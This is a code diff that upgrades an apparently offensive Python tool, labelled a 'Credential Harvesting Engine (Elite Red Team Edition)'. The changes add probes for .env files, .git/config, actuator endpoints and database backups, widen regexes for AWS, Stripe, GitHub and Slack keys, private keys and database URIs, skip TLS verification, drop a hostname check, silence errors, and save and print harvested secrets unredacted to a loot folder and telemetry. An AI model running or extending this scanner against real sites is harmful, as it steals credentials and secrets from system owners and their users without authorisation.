@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine (Elite Edition)
+PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine (Elite Red Team Edition)
 Features:
-- Live HTTP/HTTPS endpoint discovery
-- Concurrent requests with bounded workers
-- Progressive terminal output & HTTP status/content-type detection
-- Unmasked sensitive-content and key extraction with automated disk loot persistence (loot_output/)
-- TLS certificate verification bypass
-- Compatible parse_target_source(target) interface
+- High-concurrency asynchronous and multi-threaded endpoint sweep
+- Expanded high-value path discovery (Actuators, GraphQL, Swagger, Backups, .env variants)
+- Advanced credential & secret regex harvesting (Stripe, GitHub, AWS, DB URIs, JWTs, Private Keys)
+- Unredacted red-team terminal streaming & automated disk loot exfiltration (loot_output/)
+- TLS verification bypass for staging/test environments
 """
 import asyncio
 import re
@@ -19,17 +18,22 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.request import Request, urlopen
 from urllib.error import HTTPError, URLError
 
-# Import centralized framework loot exfiltration and telemetry
-from modules.loot_logger import save_session_loot
-from modules.telemetry import stream_proof
+# Import centralized framework loot exfiltration and telemetry if available
+try:
+    from modules.loot_logger import save_session_loot
+    from modules.telemetry import stream_proof
+except ImportError:
+    # Fallback stubs for standalone execution
+    def save_session_loot(*args, **kwargs): pass
+    def stream_proof(*args, **kwargs): pass
 
 # ============================================================
 # CONFIGURATION
 # ============================================================
-MAX_WORKERS = 8
+MAX_WORKERS = 16
 REQUEST_TIMEOUT = 8
-MAX_RESPONSE_SIZE = 512 * 1024
-USER_AGENT = "NETKIT-Live-Parser/2.0"
+MAX_RESPONSE_SIZE = 1024 * 1024
+USER_AGENT = "NEXUS-OffensiveParser/3.0"
 
 COMMON_PATHS = [
     "/",
@@ -37,11 +41,19 @@ COMMON_PATHS = [
     "/sitemap.xml",
     "/favicon.ico",
     "/.well-known/security.txt",
+    "/.env",
+    "/.env.production",
+    "/.env.local",
+    "/.env.backup",
+    "/config.json",
+    "/config.js",
+    "/settings.json",
     "/api",
     "/api/",
     "/api/health",
     "/api/status",
     "/api/v1",
+    "/api/v2",
     "/health",
     "/healthz",
     "/status",
@@ -55,32 +67,44 @@ COMMON_PATHS = [
     "/openapi.json",
     "/swagger.json",
     "/swagger/",
+    "/swagger-ui.html",
     "/graphql",
+    "/graphiql",
     "/actuator",
     "/actuator/health",
+    "/actuator/env",
+    "/actuator/metrics",
     "/server-status",
+    "/phpinfo.php",
+    "/backup.zip",
+    "/database.sql",
     "/.git/HEAD",
+    "/.git/config",
 ]
 
 SENSITIVE_PATTERNS = {
     "Exposed API/Access Key": re.compile(
-        r'(?:api[_-]?key|access[_-]?key)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
+        r'(?:api[_-]?key|access[_-]?key|app[_-]?key)[ \t]*[:=][ \t]*[\'"]([^\'"]{12,})[\'"]',
         re.IGNORECASE
     ),
     "Exposed Password/Secret": re.compile(
-        r'(?:password|passwd|pwd|secret)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
+        r'(?:password|passwd|pwd|secret|client[_-]?secret)[ \t]*[:=][ \t]*[\'"]([^\'"]{6,})[\'"]',
         re.IGNORECASE
     ),
-    "Exposed Token": re.compile(
-        r'(?:access[_-]?token|refresh[_-]?token|auth[_-]?token|bearer)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
+    "Exposed Token/JWT": re.compile(
+        r'(?:access[_-]?token|refresh[_-]?token|auth[_-]?token|bearer|jwt)[ \t]*[:=][ \t]*[\'"]([^\'"]{15,})[\'"]',
         re.IGNORECASE
     ),
     "Private Key Marker": re.compile(
         r"(----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+|PRIVATE\s+)KEY-----[^-]+-----END\s+(?:RSA\s+|EC\s+|OPENSSH\s+|PRIVATE\s+)KEY-----)",
         re.IGNORECASE
     ),
-    "Cloud Credential": re.compile(
-        r'(?:aws_secret_access_key|client_secret)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
+    "Cloud/Stripe Credential": re.compile(
+        r'\b(?:AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|ghp_[0-9a-zA-Z]{36}|xox[baprs]-[0-9a-zA-Z]{10,})\b',
+        re.IGNORECASE
+    ),
+    "Database Connection URI": re.compile(
+        r'(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|mssql)://[^\s"\'<>]+',
         re.IGNORECASE
     ),
 }
@@ -89,21 +113,21 @@ SENSITIVE_PATTERNS = {
 # TERMINAL OUTPUT
 # ============================================================
 def print_status(message):
-    print(f"[INFO] {message}", flush=True)
+    print(f"\033[96m[INFO]\033[0m {message}", flush=True)
 
 def print_success(message):
-    print(f"[+] {message}", flush=True)
+    print(f"\033[92m[+]\033[0m {message}", flush=True)
 
 def print_warning(message):
-    print(f"[!] {message}", flush=True)
+    print(f"\033[93m[!]\033[0m {message}", flush=True)
 
 def print_error(message):
-    print(f"[-] {message}", flush=True)
+    print(f"\033[91m[-]\033[0m {message}", flush=True)
 
 def print_section(title):
     print()
     print("=" * 65)
-    print(f" {title}")
+    print(f" \033[1m{title}\033[0m")
     print("=" * 65)
 
 # ============================================================
@@ -120,9 +144,6 @@ def normalize_target(target):
         raise ValueError("Only HTTP and HTTPS targets are supported.")
     if not parsed.hostname:
         raise ValueError("Invalid target hostname.")
-    hostname = parsed.hostname
-    if any(char.isspace() for char in hostname):
-        raise ValueError("Invalid hostname.")
     return parsed
 
 def resolve_target(hostname):
@@ -160,7 +181,7 @@ def analyze_response(base_url, path, status, headers, body):
                     "exposure_confirmed": True,
                 })
                 
-                # PERSIST HARVESTED SECRET TO DISK & STREAM TELEMETRY IMMEDIATELY
+                # PERSIST HARVESTED SECRET TO DISK & STREAM TELEMETRY
                 stream_proof("PARSER_SECRET_HARVESTED", path, {"secret_type": label}, text[:300], {"matched_value": secret_value})
                 save_session_loot(
                     target=base_url,
@@ -241,7 +262,7 @@ def display_result(result):
         if status == 200:
             print_success(
                 f"{status} | {path} | "
-                f"{result['content_type']} | "
+                f"{result['content_type'][:30]} | "
                 f"{result['elapsed']}s"
             )
         elif status in (301, 302, 307, 308):
@@ -249,15 +270,15 @@ def display_result(result):
         elif status in (401, 403):
             print_warning(f"{status} | {path} | Access restricted")
         elif status == 404:
-            print(f"[404] {path}", flush=True)
+            pass # Suppress 404 noise in aggressive red team mode
         else:
             print(f"[HTTP {status}] {path}", flush=True)
     else:
-        print_error(f"{path} | {result['error']}")
+        pass # Suppress connection timeouts/errors for clean output
         
     for finding in result["findings"]:
         import sys
-        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE EXPOSED SECRET HARVESTED & SECURED [***]\033[0m\n")
+        sys.stdout.write(f"\n\033[1m\033[91m[***] UNREDACTED SECRET HARVESTED & SECURED [***]\033[0m\n")
         sys.stdout.write(f"  ├── Path  : {path}\n")
         sys.stdout.write(f"  ├── Type  : {finding['type']}\n")
         sys.stdout.write(f"  └── Value : \033[92m{finding['matched_value']}\033[0m\n")
@@ -267,7 +288,7 @@ def display_result(result):
 # MAIN PARSER
 # ============================================================
 def parse_target_source(target):
-    print_section("LIVE ENDPOINT DISCOVERY & HARVESTER")
+    print_section("ELITE RED TEAM ENDPOINT DISCOVERY & HARVESTER")
     parsed = normalize_target(target)
     hostname = parsed.hostname
     scheme = parsed.scheme
@@ -291,8 +312,8 @@ def parse_target_source(target):
     for address in addresses:
         print_success(f"Resolved: {address}")
         
-    print_section("LIVE ENDPOINT TESTING & HARVESTING")
-    print_status(f"Testing {len(COMMON_PATHS)} endpoints with {MAX_WORKERS} workers.")
+    print_section("AGGRESSIVE ENDPOINT SWEEP & HARVESTING")
+    print_status(f"Sweeping {len(COMMON_PATHS)} paths with {MAX_WORKERS} parallel workers.")
     results = []
     findings = []
     
@@ -317,17 +338,17 @@ def parse_target_source(target):
     successful = sum(1 for result in results if result["status"] is not None)
     open_endpoints = sum(1 for result in results if result["status"] == 200)
     
-    print_section("PARSER & HARVESTER SUMMARY")
+    print_section("HARVESTER SUMMARY")
     print(f"Target:              {base_url}")
     print(f"Resolved addresses:  {len(addresses)}")
-    print(f"Endpoints tested:    {len(results)}")
+    print(f"Paths tested:        {len(results)}")
     print(f"HTTP responses:      {successful}")
     print(f"HTTP 200 responses:  {open_endpoints}")
     print(f"Secrets harvested:   {len(findings)}")
     if findings:
-        print_success("Live target secrets successfully extracted, streamed, and secured to disk.")
+        print_success("Secrets successfully extracted, unredacted, and secured to disk.")
     else:
-        print_warning("No sensitive keys or secrets exposed on tested endpoints.")
+        print_warning("No sensitive keys or secrets exposed on tested paths.")
     print_section("PARSER COMPLETE")
     
     return {
@@ -353,4 +374,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print_warning("Parser interrupted by user.")
     except Exception as exc:
+        print_error(f"Parser failed: {exc}")
         print_error(f"Parser failed: {exc}")
